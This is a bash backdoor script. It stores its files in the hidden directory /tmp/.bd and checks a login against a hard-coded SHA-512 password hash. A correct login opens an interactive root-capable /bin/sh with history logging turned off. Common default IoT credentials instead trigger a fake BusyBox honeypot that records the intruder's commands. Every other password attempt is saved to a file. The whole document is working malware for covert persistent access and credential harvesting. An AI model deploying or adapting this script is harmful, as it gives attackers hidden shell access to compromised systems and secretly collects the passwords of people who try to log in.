# Hash here at top for easy sed passwd change
hash="3dd28c5a23f780659d83dd99981e2dcb82bd4c4bdc8d97a7da50ae84c7a7229a6dc0ae8ae4748640a4cc07ccc2d55dbdc023a99b3ef72bc6ce49e30b84253dae"

backdoor(){
cd /tmp/.bd # We should be in a writable directory
export PATH=/usr/sbin:/bin:/usr/bin:/sbin:/var/bin
  for i in $(seq 1 5);do # 5 attemps before urandom blast
    unset $l00s3rshame 2>/dev/null 
    unset $magic 2>/dev/null # always make sure password is unset
    set +a # don't export variables
    read -r -p "Username : " l00s3rshame 2>&1  # get username. kinda messy
    if printf "$l00s3rshame\n"| grep -q 'shellz\|admin\|tech\|Admin\|user'; then
      IFS= read -r -s -p "Password : " magic 2>&1 && \
      printf "$magic" >/tmp/.bd/.pass;unset magic 2>/dev/null # write and erase from memory
      if echo "$hash */tmp/.bd/.pass" | sha512sum -c - > /dev/null 2>&1; then # check hash
        >/tmp/.bd/.pass; # zero the temporary file (mktemp would be smart here)
        printf "\nAccess Granted!\n" # user is in
        set authtoken="true" # double measure of auth
        if $authtoken;then
          export HOME=/tmp # stuff to do before the shell
          export HISTFILE=/dev/null
          /bin/sh -i 2>&1 # our shell
          exit
        fi
        unset $authtoken 2>/dev/null # unset all our stuff (again)
        unset $l00s3rshame 2>/dev/null
        unset $magic 2>/dev/null 
      elif grep -q 'admin\|root\|toor\|xc3511\|vizxv\|888888\|support\|user\|tech' /tmp/.bd/.pass ; then # or if its a honey trigger password (like 'admin' ...)
        printf '\nBusyBox v1.01 (2013.08.17-05:44+0000) Built-in shell (msh)\nEnter "help" for a list of built-in commands.\n'
        for i in $(seq 1 10);do # allow them to run ten commands 
         read -rp  "#" payload 2>&1 >/dev/stdout
          echo "$payload" >>/tmp/.bd/payloads # Save the commands
	  unset payload
          arr[0]="Segmentation fault. Core dumped."
   	  arr[1]="error: not enough arguments"
  	  arr[2]="exec: file format error"
 	  arr[3]="SIGSEGV: Core dumped."
	  arr[4]="Sementation fault."
	  arr[5]="sh: command not found"
	  arr[6]="sh: no such file or directory"
	  arr[7]="/lib/ld-uClibc.so.0: No such file or directory"
	  arr[8]="Unexpected ‘;’, expecting ‘;’"
	  arr[9]="Error: Error ocurred when attempting to print error message."
	  arr[10]="User Error: An unknown error has occurred in an unidentified program "
	  arr[11]="while executing an unimplemented function at an undefined address. "
	  arr[12]="Correct error and try again."
	  arr[13]="Kernel panic - not syncing: (null)"
	  arr[14]="No."
	  arr[15]="syntax error: Unexpected: ‘/’ Expected: ‘\\’" "sh: permission denied"
	  arr[16]="EOF error: broken pipe." "sh: Operation not permitted"
	  arr[17]="error: init: Id \"3\" respawning too fast: disabled for 5 minutes: "
	  arr[18]="command failed"
          arr[19]="Can’t cast a void type to type void."
	  arr[20]="Keyboard not present, press any key"
          arr[21]="User Error: An unknown error has occurred in an unidentified program while executing an unimplemented function at an undefined address. Correct error and try again."
          arr[22]="FATAL! Data corrupt at an unknown memory address, nothing to be done about it."
          arr[23]="??? -- Something horrible just happened, please ensure all cables are securely connected!"
	  rand=$[ $RANDOM % 24 ]
	  echo ${arr[$rand]}     
        done
        head -n 500 /dev/urandom 2>/dev/null 0</dev/null
        exit
      else # otherwise just say unauthorized... 
        printf "Unauthorized!\n"
        cat /tmp/.bd/.pass >>/tmp/.bd/passwords # ... but store the password
        sleep 1      
  fi
else
  printf "Unauthorized!\n" 2>/dev/null # end if for username
  sleep 1 2>/dev/null
fi
done # Three bad auths, so urandom blast!

printf "Too many authentication failures.\n Wait for it...\n" 2>/dev/null
sleep 1
head -n 500 /dev/urandom 2>/dev/null 0</dev/null
exit
}
# create stuff we need
if [ ! -d /tmp/.bd ];then mkdir /tmp/.bd ;fi ; chmod 700 /tmp/.bd
if [ ! -f /tmp/.bd/passwords ];then >/tmp/.bd/passwords;fi ; chmod 600 /tmp/.bd/passwords
if [ ! -f /tmp/.bd/payloads ];then >/tmp/.bd/payloads;fi
backdoor 2>/dev/null
exit
